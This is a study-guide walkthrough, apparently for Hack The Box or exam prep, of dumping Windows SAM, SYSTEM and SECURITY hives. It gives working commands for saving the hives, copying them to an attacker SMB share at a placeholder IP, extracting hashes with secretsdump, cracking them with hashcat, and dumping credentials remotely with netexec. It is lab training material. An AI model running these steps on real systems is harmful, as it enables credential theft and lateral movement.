This is one of the core **Windows credential dumping** concepts for your HTB/Windows privilege escalation path.

I’ll break it down the Obsidian-style way so it clicks.

---

# Attacking SAM, SYSTEM, and SECURITY

## Big picture

When you get **administrator access** on a Windows machine, your goal is often:

> Extract password hashes → crack them offline → get plaintext passwords → move laterally to other machines

Windows stores credential-related secrets in **registry hives**.

Think of them like locked vault files.

You need **3 important vaults**:

|Hive|What it contains|Why you want it|
|---|---|---|
|**SAM**|Local account password hashes|Crack local user passwords|
|**SYSTEM**|BootKey|Needed to decrypt SAM hashes|
|**SECURITY**|LSA secrets, cached creds, DPAPI keys|Extra credentials and secrets|

---

# Why SYSTEM is required

This part confuses almost everyone at first.

The **SAM file is encrypted**.

Windows uses a key stored in **SYSTEM** called the **BootKey**.

So:

```text
SAM alone = useless encrypted hashes
SYSTEM + SAM = decryptable hashes
```

That’s why secretsdump first says:

```text
[*] Target system bootKey: ...
```

It extracts the decryption key from SYSTEM.

---

# Step 1 — Save the registry hives

If you have admin shell:

```cmd
reg save HKLM\SAM C:\sam.save
reg save HKLM\SYSTEM C:\system.save
reg save HKLM\SECURITY C:\security.save
```

This copies those protected registry hives into files.

Why?

Because you want to steal them and analyze them on Kali.

---

# Step 2 — Transfer them to Kali

Using SMB share from your attacker box.

On Kali:

```bash
impacket-smbserver -smb2support CompData .
```

This creates a fake Windows share.

Then on target:

```cmd
move sam.save \\ATTACKER-IP\CompData
move system.save \\ATTACKER-IP\CompData
move security.save \\ATTACKER-IP\CompData
```

Now the files are on your Kali machine.

---

# Step 3 — Extract hashes with secretsdump

Run:

```bash
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

This decrypts and parses everything.

Output:

```text
bob:1001:LMHASH:NTHASH:::
```

Format:

```text
username : RID : LM hash : NT hash
```

Example:

```text
bob:1001:aad3...:64f12cddaa88057...
```

The NT hash is what you usually care about.

---

# About LM hash

You’ll often see:

```text
aad3b435b51404eeaad3b435b51404ee
```

This usually means:

> LM hash is disabled

Modern Windows mostly uses **NTLM/NT hashes**.

---

# Step 4 — Crack NT hashes

Put hashes into file:

```bash
nano hashes.txt
```

Then run Hashcat:

```bash
hashcat -m 1000 hashes.txt rockyou.txt
```

### Why `-m 1000`?

Hashcat mode numbers identify hash types.

|Mode|Hash type|
|---|---|
|1000|NTLM|
|2100|DCC2|

---

# Example cracked output

```text
f7eb9...:dragon
6f8c3...:iloveme
```

Meaning:

```text
hash -> plaintext password
```

Now you can try:

- SMB login
    
- WinRM
    
- RDP
    
- Password reuse on other systems
    

This is **credential reuse exploitation**.

---

# DCC2 hashes

These come from **cached domain logins**.

Example:

```text
$DCC2$10240#administrator#hash
```

These are:

- Much slower to crack
    
- PBKDF2 protected
    
- Not usable for Pass-the-Hash
    

Crack with:

```bash
hashcat -m 2100 hash.txt rockyou.txt
```

---

## Why slower?

NTLM:

```text
Fast hash
```

DCC2:

```text
PBKDF2 with many iterations
```

That means:

More computation per guess.

This is why:

- NTLM might crack at millions/sec
    
- DCC2 only thousands/sec
    

---

# DPAPI

This is another huge concept.

DPAPI encrypts secrets for users.

Examples:

- Chrome saved passwords
    
- Wi-Fi passwords
    
- RDP creds
    
- Credential Manager entries
    
- Outlook passwords
    

If you dump DPAPI keys, you can decrypt these.

Example:

```text
dpapi_machinekey
dpapi_userkey
```

These unlock encrypted blobs.

That’s how tools like:

- Mimikatz
    
- DonPAPI
    
- Impacket DPAPI
    

recover browser passwords.

---

# Remote dumping

If you already have admin creds:

Instead of getting shell access first, dump remotely.

### Dump SAM remotely

```bash
netexec smb TARGET -u user -p pass --sam
```

### Dump LSA secrets

```bash
netexec smb TARGET -u user -p pass --lsa
```

This is cleaner and faster during assessments.

---

# The attack chain to memorize

For exams / HTB:

```text
Gain admin
   ↓
Dump SAM/SYSTEM/SECURITY
   ↓
Extract hashes
   ↓
Crack offline
   ↓
Recover plaintext creds
   ↓
Reuse credentials
   ↓
Move laterally
```

---

# The key exam takeaway

Memorize this:

### Local hashes

```bash
reg save
secretsdump
hashcat -m 1000
```

### Cached domain creds

```bash
hashcat -m 2100
```

### Remote dumping

```bash
netexec --sam
netexec --lsa
```

---

## The one concept you absolutely need to understand

**Why do we need SYSTEM with SAM?**

Because:

```text
SAM contains encrypted hashes
SYSTEM contains key to decrypt them
```

No SYSTEM = no decryption.

That’s the foundation of this whole attack.